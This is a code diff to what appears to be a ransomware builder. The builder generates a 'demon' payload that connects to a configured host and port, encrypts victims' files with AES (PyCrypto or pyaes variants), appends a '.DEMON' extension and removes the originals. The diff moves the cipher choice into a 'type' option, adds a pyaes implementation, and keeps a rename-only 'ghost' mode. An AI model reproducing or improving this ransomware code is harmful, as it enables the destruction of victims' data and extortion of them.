@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, ghost, msg, img_base64, mode, debug):
+def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
@@ -25,18 +25,7 @@ def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
 def pad(s):
     return s + b'\\0' * (AES.block_size - len(s) % AES.block_size)
 
-def encrypt(message, key, key_size=256):
-    message = pad(message)
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return iv + cipher.encrypt(message)
-
-def encrypt_file(file_name, key):
-    with open(file_name, 'rb') as fo:
-        plaintext = fo.read()
-    enc = encrypt(plaintext, key)
-    with open(file_name + ".DEMON", 'wb') as fo:
-        fo.write(enc)
+<type>
 
 
 host = '<host>'
@@ -207,6 +196,43 @@ class mainwindow(Tk):
     demon = demon.replace("<host>", host)
     demon = demon.replace('<port>', str(port))
 
+    if type == 'ghost':
+        demon = demon.replace('<import_random>', '')
+        demon = demon.replace('<import_aes>', '')
+        demon = demon.replace('<type>', '')
+        demon = demon.replace('encrypt_file(os.path.join(path, name), key)', "os.rename(os.path.join(path, name), os.path.join(path, name) + '.DEMON')")
+        demon = demon.replace('os.remove(os.path.join(path, name))', '')
+    elif type == 'pycrypto':
+        type = """def encrypt(message, key, key_size=256):
+    message = pad(message)
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(message)
+
+def encrypt_file(file_name, key):
+    with open(file_name, 'rb') as fo:
+        plaintext = fo.read()
+    enc = encrypt(plaintext, key)
+    with open(file_name + ".DEMON", 'wb') as fo:
+        fo.write(enc)
+"""
+        demon = demon.replace('<import_random>', 'from Crypto import Random')
+        demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
+        demon = demon.replace('<type>', type)
+    elif type == 'pyaes':
+        type ="""def encrypt_file(file_name, key):
+        aes = pyaes.AESModeOfOperationCTR(key)
+
+        with open(file_name, 'rb') as fo:
+            plaintext = fo.read()
+        enc = aes.encrypt(plaintext)
+        with open(file_name + '.DEMON', 'wb') as fo:
+            fo.write(enc)
+"""
+        demon = demon.replace('<import_random>', '')
+        demon = demon.replace('<import_aes>', 'import pyaes')
+        demon = demon.replace('<type>', type)
+
     if debug == 0:
         demon = demon.replace('<debug>', '')
     elif debug == 1:
@@ -218,12 +244,6 @@ class mainwindow(Tk):
     elif fullscreen == 0:
         # Replace setting with empty string
         demon = demon.replace('<fullscreen>', '')
-
-    if ghost == 1:
-        demon = demon.replace('<import_random>', '')
-        demon = demon.replace('<import_aes>', '')
-        demon = demon.replace('encrypt_file(os.path.join(path, name), key)', "os.rename(os.path.join(path, name), os.path.join(path, name) + '.DEMON')")
-        demon = demon.replace('os.remove(os.path.join(path, name))', '')
 
     if demo == 1:
         # Disable encrypting
